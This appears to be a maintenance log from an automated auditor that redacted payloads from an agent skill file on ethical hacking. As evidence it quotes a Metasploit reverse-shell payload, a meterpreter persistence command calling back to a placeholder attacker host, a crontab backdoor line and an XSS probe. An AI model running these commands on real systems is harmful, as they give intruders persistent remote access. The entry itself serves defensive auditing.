# 2026-05-10: Malicious Skill Safety Auditor

## Selected skill
`skills/ethical-hacking-methodology`

## Risk evidence reviewed
The skill `skills/ethical-hacking-methodology` contained active reverse shell commands, payload generation patterns, and potentially harmful persistent installation and enumeration instructions. Examples included:
- `msf> set PAYLOAD windows/meterpreter/reverse_tcp`
- `meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip`
- `echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab`
- `<script>alert('XSS')</script>`

These instructions violate the safe operations guidance and must be redacted to prevent misuse or inadvertent deployment by agents consuming this skill.

## Files changed
- `skills/ethical-hacking-methodology/SKILL.md` (Hardened payload strings with `[REDACTED_*]` placeholders)
- `data/maintenance/ledger.json` (Updated tracking entry)

## Linked PR/issue
PR-ethical-hacking-methodology-hardening

## Next action
Monitor for re-introduction of active payloads.